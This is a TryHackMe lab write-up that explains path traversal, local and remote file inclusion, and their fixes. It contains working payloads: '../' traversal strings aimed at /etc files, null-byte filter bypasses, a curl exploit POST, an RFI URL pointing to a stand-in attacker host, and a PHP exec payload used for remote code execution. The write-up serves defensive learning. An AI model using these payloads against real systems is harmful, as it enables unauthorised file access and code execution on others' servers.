# File Inclusion (Path Traversal, LFI & RFI) — TryHackMe

**Date:** 2026-07-23  
**Category:** Web, Server-Side  
**Skills used:** Path traversal, LFI, RFI, null-byte injection, Burp Repeater, cookie manipulation  

> **TL;DR:** Exploited file inclusion across four labs — reading flags via LFI and path
> traversal (using `%00` null-byte injection to defeat an appended extension and a `./` filter),
> and achieving **remote code execution via RFI** by hosting a malicious PHP file and having the
> target execute it.

## Overview
Many web applications load files based on user input — a language file, a template, a page
fragment (e.g. `?page=home`). If that input is used to build a file path **without proper
validation**, an attacker can change which file gets loaded. Depending on how the app then
*uses* that file, the impact ranges from reading sensitive files to full remote code execution.
The root cause across all three techniques is the same: **untrusted input reaching a file
operation.**

## Path Traversal (Directory Traversal)
The application uses input directly in a path and doesn't restrict where that path can point. By
inserting `../` sequences, an attacker climbs *up* out of the intended directory to reach files
elsewhere on the system:

```
?file=../../../../etc/passwd
```

Each `../` moves up one directory; enough of them reach the filesystem root, from where a known
path like `/etc/passwd` (Linux) or a Windows equivalent can be read. This is purely about
**reading files outside the intended folder**.

## Local File Inclusion (LFI)
LFI occurs when the application **includes and processes** a *local* file chosen by user input
(common in PHP with functions like `include()`). It goes a step beyond plain traversal because
the included file may be *executed*, not just read.

- **Reading sensitive files:** same traversal idea — pull config files, `/etc/passwd`, etc.
- **Bypassing naive filters:** apps that strip or expect certain strings can sometimes be
  defeated by encoding or path tricks (similar in spirit to the deny-list bypass in my SSRF
  writeup).
- **Escalating to code execution (log poisoning):** if an attacker can get attacker-controlled
  text into a file the server will *include and execute* (for example, injecting a payload into
  a log entry via a crafted request, then including that log file), LFI can be chained into
  **remote code execution**. The key idea is turning a "read any file" bug into "run my code."

## Remote File Inclusion (RFI)
RFI is the most severe: the application includes a file from a **remote URL** supplied by the
attacker. If the attacker hosts a malicious script on their own server and the target includes
it, that code runs on the target:

```
?file=http://attacker-server.thm/malicious.txt
```

RFI generally requires the server to be configured to allow fetching remote resources for
inclusion (in PHP, `allow_url_include`). It's rarer than LFI for that reason, but the impact —
direct code execution from an attacker-controlled source — is why it's treated as critical.

## Hands-On: TryHackMe Lab

### Lab 1 — POST-based inclusion via Burp Repeater
The input form was broken, so the `file` parameter had to be sent as a **POST** request. Using
**Burp Suite Repeater**, I sent the request with the file path directly and captured the flag:

```
file=/etc/flag1
```

*Why it worked:* the endpoint included whatever path the `file` parameter pointed to, with no
restriction on location.

### Lab 2 — Access control + traversal + null byte
Only admins could view the page, so first I changed my **cookie to an admin value** to reach it.
Then I passed a traversal payload through the cookie to read the flag:

```
../../../../etc/flag2%00
```

*Why it worked:* the `../` sequences climb to the filesystem root, and the **`%00` null byte**
truncates the string — so any file extension the app tried to append was discarded, letting me
include `/etc/flag2` directly. (Null-byte injection works on older PHP versions where `%00`
terminates the string.)

### Lab 3 — Filter bypass + appended extension
This lab had a filter that strips `./` from the input and appends `.php` to the end. I still
reached the flag with a crafted traversal path plus a null byte to drop the appended extension:

```bash
curl -X POST http://LabMachine/challenges/chall3.php \
  -d 'method=POST&file=../../../etc/flag3%00'
```

*Why it worked:* the `%00` truncates the path before the forced `.php` is applied, so the server
resolves `/etc/flag3` instead of `/etc/flag3.php` — beating both the filter and the extension
append.

### Lab 4 — RFI to remote code execution
For the final lab I hosted a malicious PHP file and served it over a simple web server, then had
the target include it via **RFI**:

```php
// hostname.php, served from my Python HTTP server
<?php echo exec("hostname"); ?>
```

I started the server (`python3 -m http.server`) and pointed the vulnerable `file` parameter at
it. Because the app included and executed the remote file, my `exec("hostname")` ran **on the
target**, confirming remote code execution and revealing the flag.

*Why it worked:* the server allowed remote URL inclusion, so it fetched and executed
attacker-controlled code — the defining behavior of RFI.

## The Fix (Defensive View)
The root cause is untrusted input reaching a file operation. Defenses, strongest first:
- **Avoid passing user input to file paths at all** — the real fix. Map user choices to a
  fixed **allow-list** of permitted files (e.g. `1 → home.php`) instead of using the input as a
  path.
- **Validate and canonicalize paths** — resolve the final path and confirm it stays within the
  intended directory, rejecting `../` sequences and encoded variants.
- **Disable remote inclusion** — turn off `allow_url_include` / `allow_url_fopen` so RFI is
  impossible.
- **Least privilege** — run the web server as a low-privilege user so even a successful read
  reaches fewer sensitive files.

## What I Learned
Learned how path traversal, LFI, and RFI relate as an escalating chain built on the *same* root
cause — untrusted input in a file operation — with impact rising from **reading files**
(traversal) to **executing remote code** (RFI, demonstrated hands-on with `exec("hostname")`).
The standout technique was **null-byte injection (`%00`)**: in labs 2 and 3 it let me truncate a
server-appended `.php` extension and slip past a filter, turning a blocked include into a
successful one. And the fix lesson echoed my SSRF writeup — *stop using user input as a path*
and map to an allow-list instead of trying to filter bad input, because filters (like the `./`
stripper in lab 3) can be bypassed.
